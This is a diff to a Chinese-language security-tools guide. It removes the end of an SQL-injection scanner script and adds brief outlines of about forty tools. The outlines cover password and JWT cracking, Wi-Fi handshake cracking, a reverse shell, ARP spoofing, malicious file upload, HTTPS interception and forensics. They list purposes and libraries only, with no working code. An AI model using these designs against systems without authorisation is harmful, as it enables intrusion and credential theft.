-    results = scanner.scan_url(url)
-    
-    if results:
-        print("\n[!] 扫描报告")
-        print("=" * 50)
-        
-        for i, result in enumerate(results, 1):
-            print(f"\n漏洞 #{i}")
-            print(f"类型: {result.type.value}")
-            print(f"参数: {result.parameter}")
-            print(f"描述: {result.description}")
-            print(f"风险等级: {result.risk_level}")
-            print(f"POC: {result.poc}")
-            print("\n详细信息:")
-            for k, v in result.details.items():
-                print(f"  {k}: {v}")
-            print("\n修复建议:")
-            for rec in result.recommendations:
-                print(f"  {rec}")
-            print("-" * 50)
-    else:
-        print("\n[+] 未发现明显的SQL注入漏洞")
+**作用**：爬取目标网站内容，根据特征识别目标的技术栈或 CMS 系统。
 
-if __name__ == "__main__":
-    main()
-    
-```
+**关键库**：`requests`, `BeautifulSoup`
+
+**实现思路**：
+
+- 提取网站的 HTML 标记、JS 文件、CSS 文件等信息。
+- 匹配已知特征库，推测网站技术栈。
+
+---
+
+### **10. 文件上传漏洞检测工具 📤🛠️**
+
+**作用**：测试目标网站是否允许上传危险文件（如 PHP 脚本）。
+
+**关键库**：`requests`
+
+**实现思路**：
+
+- 上传伪装的文件（如 `test.php`）。
+- 检测是否可以通过 URL 直接访问文件。
+
+---
+
+### **11. 开放端口服务探测工具 🔎⚡**
+
+**作用**：扫描目标开放端口，获取服务 Banner 信息。
+
+**关键库**：`socket`, `subprocess`
+
+**实现思路**：
+
+- 使用 `socket` 连接端口，获取 Banner 数据（如 FTP、SMTP 服务信息）。
+- 输出识别到的服务类型和版本。
+
+---
+
+### **12. HTTP 响应时间分析工具 ⏱️📡**
+
+**作用**：分析目标网站的响应时间，检测性能瓶颈或防火墙干扰。
+
+**关键库**：`requests`, `time`
+
+**实现思路**：
+
+- 使用 `time` 模块记录请求响应时间。
+- 支持多次测试，输出平均响应时间。
+
+---
+
+### **13. HTTP 参数爆破工具 🚀🔗**
+
+**作用**：检测隐藏的 HTTP 参数（如 `debug`, `test`）。
+
+**关键库**：`requests`, `itertools`
+
+**实现思路**：
+
+- 使用参数字典逐个尝试传递参数。
+- 检测返回结果是否发生变化。
+
+---
+
+### **14. WAF 探测工具 🛡️⚡**
+
+**作用**：检测目标网站是否部署了 Web 应用防火墙（WAF）。
+
+**关键库**：`requests`
+
+**实现思路**：
+
+- 发送恶意请求（如 SQL 注入 Payload）。
+- 检测响应是否包含 WAF 特征（如阻断页面）。
+
+---
+
+### **15. TLS/SSL 配置检测工具 🔐🌍**
+
+**作用**：分析目标网站的 TLS/SSL 配置，检测是否存在弱点。
+
+**关键库**：`ssl`, `socket`
+
+**实现思路**：
+
+- 获取目标服务器的证书信息（如过期时间、加密算法）。
+- 检查是否启用了弱加密协议（如 SSLv2）。
+
+---
+
+---
+
+## **二、密码破解工具 🔓🔑**
+
+### **16. 哈希破解工具 🧮🔓**
+
+**作用**：通过字典或暴力破解常见哈希（如 MD5、SHA-1）。
+
+**关键库**：`hashlib`, `itertools`
+
+**实现思路**：
+
+- 使用字典生成可能的明文组合。
+- 将每个明文加密后与目标哈希值对比。
+
+---
+
+### **17. ZIP 文件密码破解工具 📦🔓**
+
+**作用**：破解加密的 ZIP 文件密码。
+
+**关键库**：`zipfile`, `itertools`
+
+**实现思路**：
+
+- 使用密码字典或暴力生成密码组合。
+- 尝试解压文件，验证密码是否正确。
+
+---
+
+### **18. Wi-Fi 握手包密码破解工具 📶🔓**
+
+**作用**：解析 Wi-Fi 握手包中的加密数据，尝试破解密码。
+
+**关键库**：`scapy`, `hashlib`
+
+**实现思路**：
+
+- 使用 `scapy` 提取握手包中的加密信息。
+- 结合密码字典进行暴力破解。
+
+---
+
+### **19. PDF 文件密码破解工具 📄🔓**
+
+**作用**：破解加密 PDF 文件的访问密码。
+
+**关键库**：`PyPDF2`, `itertools`
+
+**实现思路**：
+
+- 使用 `PyPDF2` 加载 PDF 文件，逐一尝试密码。
+- 输出成功破解的密码。
+
+---
+
+### **20. JWT 密钥破解工具 🧩🔑**
+
+**作用**：暴力破解 JSON Web Token 的签名密钥（HMAC）。
+
+**关键库**：`jwt`, `hashlib`
+
+**实现思路**：
+
+- 使用字典生成可能的密钥。
+- 验证生成的 Token 是否与目标 Token 匹配。
+
+---
+
+### **21. 基于社工规则的密码生成工具 🧑‍💻🔐**
+
+**作用**：根据目标的社交信息生成可能的密码列表。
+
+**关键库**：`itertools`
+
+**实现思路**：
+
+- 输入目标的相关信息（如姓名、生日、爱好）。
+- 根据常见密码组合规则生成密码。
+
+---
+
+---
+
+## **三、渗透测试工具 🛠️💻**
+
+### **22. 反向 Shell 工具 🖥️🔗**
+
+**作用**：建立反向连接，用于远程控制目标主机。
+
+**关键库**：`socket`, `subprocess`
+
+**实现思路**：
+
+- 客户端向攻击者的服务器发起连接。
+- 使用 `subprocess` 执行系统命令并返回结果。
+
+---
+
+### **23. ARP 欺骗工具 🛡️📡**
+
+**作用**：伪装为网关，拦截局域网通信。
+
+**关键库**：`scapy`
+
+**实现思路**：
+
+- 构造虚假的 ARP 响应包并发送到局域网设备。
+- 将目标设备的流量中转到攻击者设备。
+
+---
+
+---
+
+## **三、渗透测试工具 🛠️💻**
+
+### **24. 缓冲区溢出测试工具 💥🧵**
+
+**作用**：测试目标服务是否存在缓冲区溢出漏洞。
+
+**关键库**：`socket`
+
+**实现思路**：
+
+- 构造超长的字符串填充缓冲区。
+- 发送到目标服务，观测是否导致崩溃或异常行为。
+- 可进一步扩展为测试返回地址覆盖。
+
+---
+
+### **25. 文件上传渗透工具 📤🐍**
+
+**作用**：测试文件上传功能是否可执行恶意代码。
+
+**关键库**：`requests`
+
+**实现思路**：
+
+- 上传伪装的恶意文件（如 `.php` 或 `.jsp` 文件）。
+- 检查是否可通过 URL 访问并执行恶意脚本。
+
+---
+
+### **26. HTTP 请求重放工具 🔁📡**
+
+**作用**：重放捕获的 HTTP 请求，测试重复请求的效果（如 CSRF）。
+
+**关键库**：`requests`
+
+**实现思路**：
+
+- 从文本文件或抓包工具导入 HTTP 请求格式。
+- 使用 `requests` 模拟发送，并分析响应结果。
+
+---
+
+### **27. HTTP 响应伪造工具 🛠️🔗**
+
+**作用**：伪造 HTTP 响应包，用于测试客户端的安全性。
+
+**关键库**：`socket`, `http.server`
+
+**实现思路**：
+
+- 模拟 HTTP 服务器，构造自定义响应内容（如恶意代码）。
+- 返回伪造的响应给客户端，用于测试客户端解析行为。
+
+---
+
+### **28. 数据包重构工具 📦🔗**
+
+**作用**：将捕获的网络数据包重新组装为完整会话。
+
+**关键库**：`scapy`
+
+**实现思路**：
+
+- 从 PCAP 文件中提取 TCP/UDP 流数据包。
+- 按顺序重组为完整的网络会话数据。
+
+---
+
+### **29. 本地代理工具 🛠️🔀**
+
+**作用**：创建本地代理服务器，用于中间人攻击和数据分析。
+
+**关键库**：`socket`, `ssl`
+
+**实现思路**：
+
+- 建立监听套接字，转发客户端请求到目标服务器。
+- 可扩展为解密 HTTPS 流量，并修改请求或响应。
+
+---
+
+### **30. 网络嗅探与实时分析工具 📡📊**
+
+**作用**：捕获局域网流量并实时分析协议数据（如 HTTP、DNS）。
+
+**关键库**：`scapy`, `pyshark`
+
+**实现思路**：
+
+- 使用 `scapy` 嗅探特定协议的数据包。
+- 实时解析并提取关键信息（如 URL、域名）。
+
+---
+
+### **31. 数据包注入工具 📦💣**
+
+**作用**：向网络中注入伪造的数据包，用于测试目标的异常处理。
+
+**关键库**：`scapy`
+
+**实现思路**：
+
+- 构造自定义的 TCP/UDP 数据包（如伪造源地址）。
+- 将伪造数据包发送至目标网络。
+
+---
+
+### **32. DNS 隧道检测工具 🌐🔍**
+
+**作用**：检测目标是否利用 DNS 隧道进行数据传输。
+
+**关键库**：`scapy`, `re`
+
+**实现思路**：
+
+- 捕获 DNS 请求包并解析域名。
+- 检测域名中是否包含可疑的加密或异常数据。
+
+---
+
+### **33. 网络流量趋势分析工具 📊📈**
+
+**作用**：分析网络流量日志，识别异常流量趋势。
+
+**关键库**：`pandas`, `matplotlib`
+
+**实现思路**：
+
+- 从网络日志中提取时间戳和数据量信息。
+- 绘制流量趋势图，标注异常流量高峰。
+
+---
+
+### **34. 端口爆破工具 🎯🔑**
+
+**作用**：针对开放端口尝试暴力破解服务登录（如 Redis、MySQL）。
+
+**关键库**：`socket`, `itertools`
+
+**实现思路**：
+
+- 构造常见协议（如 Redis AUTH）的认证请求。
+- 遍历密码字典，测试服务是否接受连接。
+
+---
+
+### **35. HTTP 参数模糊测试工具 🧪🔍**
+
+**作用**：向目标网站发送随机或恶意参数，测试其异常处理能力。
+
+**关键库**：`requests`, `itertools`
+
+**实现思路**：
+
+- 生成随机参数值（如超长字符串、特殊字符）。
+- 观察目标网站是否返回异常响应或崩溃。
+
+---
+
+---
+
+## **四、数据包嗅探工具 📡**
+
+### **36. 数据包嗅探工具 🕵️‍♂️📡**
+
+**作用**：实时捕获网络流量并解析协议数据。
+
+**关键库**：`scapy`
+
+**实现思路**：
+
+- 使用 `scapy` 监听网络接口上的所有数据包。
+- 按协议类型（如 TCP、UDP、HTTP）分类解析。
+
+---
+
+### **37. HTTP 数据包分析工具 🌐🔍**
+
+**作用**：提取 HTTP 请求和响应中的关键信息。
+
+**关键库**：`scapy`, `BeautifulSoup`
+
+**实现思路**：
+
+- 捕获 HTTP 数据包，提取 URL 和 Header 信息。
+- 支持解析 HTML 响应内容。
+
+---
+
+### **38. DNS 请求记录分析工具 🌍🔗**
+
+**作用**：统计 DNS 请求中的域名及其频率。
+
+**关键库**：`scapy`, `collections`
+
+**实现思路**：
+
+- 捕获 DNS 查询包，提取域名信息。
+- 统计域名出现频率，识别异常请求。
+
+---
+
+### **39. HTTPS 数据包解密工具 🔐📦**
+
+**作用**：解密 HTTPS 流量（配合自签名证书）。
+
+**关键库**：`ssl`, `pyOpenSSL`
+
+**实现思路**：
+
+- 配置中间人代理，截获 HTTPS 流量。
+- 使用自签名证书解密流量并解析数据内容。
+
+---
+
+### **40. 网络会话重组工具 🔄📡**
+
+**作用**：将捕获的网络数据包按连接会话重组，便于分析完整通信。
+
+**关键库**：`scapy`, `itertools`
+
+**实现思路**：
+
+- 按源地址、目标地址和端口对数据包分组。
+- 按序号重组数据包，恢复完整会话。
+
+---
+
+---
+
+## **五、取证分析工具 🕵️‍♀️⚖️**
+
+### **41. 日志分析工具 📜🔍**
+
+**作用**：分析服务器日志，发现异常访问或攻击痕迹。
+
+**关键库**：`re`, `pandas`
+
+**实现思路**：
+
+- 使用正则表达式解析日志文件中的 IP 和路径。
+- 检测高频访问 IP 或异常的 HTTP 方法。
+
+---
+
+### **42. 内存转储分析工具 🧠🔗**
+
+**作用**：从内存转储中提取密码、会话令牌等敏感信息。
+
+**关键库**：`re`, `os`
+
+**实现思路**：
+
+- 读取内存转储文件，搜索常见的敏感数据模式（如密码格式）。
+- 提取并分类保存。
+
+---
+
+### **43. 文件恢复工具 🗂️♻️**
+
+**作用**：从磁盘或文件系统转储中恢复已删除文件。
+
+**关键库**：`os`, `struct`
+
+**实现思路**：
+
+- 分析文件系统结构，定位删除文件的残留数据块。
+- 重建文件并保存到本地。
+
+---
+
+### **44. 恶意软件静态分析工具 🦠🛠️**
+
+**作用**：提取恶意软件文件中的静态特征信息。
+
+**关键库**：`pefile`, `hashlib`
+
+**实现思路**：
+
+- 提取 PE 文件的导入表、节表和字符串信息。
+- 计算哈希值，匹配已知恶意文件特征库。
+
+---
+
+### **45. 网络日志分析工具 📊🕵️**
+
+**作用**：分析网络流量日志，发现潜在攻击行为（如 DoS 攻击）。
+
+**关键库**：`pandas`
+
+**实现思路**：
+
+- 按时间段统计请求频率。
+- 识别异常高频访问 IP 或重复请求。
+
+---
+
+### **46. 磁盘镜像解析工具 💽🔎**
+
+**作用**：解析磁盘镜像文件，提取文件和分区信息。
+
+**关键库**：`pytsk3`
+
+**实现思路**：
+
+- 加载磁盘镜像，提取分区表结构。
+- 遍历文件系统，提取文件内容。
+
+---
+
+### **47. 恶意代码检测工具 🦠📄**
+
+**作用**：检测文件中的恶意代码片段或特征字符串。
+
+**关键库**：`re`, `hashlib`
+
+**实现思路**：
+
+- 使用正则表达式匹配恶意代码模式。
+- 提取并标记潜在的危险代码片段。
+
+---
+
+### **48. 系统快照比较工具 🖥️🔍**
+
+**作用**：比较系统快照，检测文件或注册表的异常变化。
+
+**关键库**：`os`, `filecmp`
+
+**实现思路**：
+
+- 对比两个快照中的文件系统结构和文件内容。
+- 输出新增、删除或修改的文件列表。
+
+---
+
+### **49. 进程行为分析工具 🧩🔍**
+
+**作用**：分析系统中可疑进程的行为（如网络连接、文件操作）。
+
+**关键库**：`psutil`, `os`
+
+**实现思路**：
+
+- 使用 `psutil` 获取进程的资源使用和网络连接状态。
+- 记录可疑进程的行为日志。
+
+---
+
+### **50. 网络取证报告生成工具 📋⚖️**
+
+**作用**：自动化生成网络取证分析报告。
+
+**关键库**：`pandas`, `jinja2`
+
+**实现思路**：
+
+- 从流量日志、内存转储等数据源提取关键信息。
+- 使用模板生成 HTML 或 PDF 格式的分析报告。
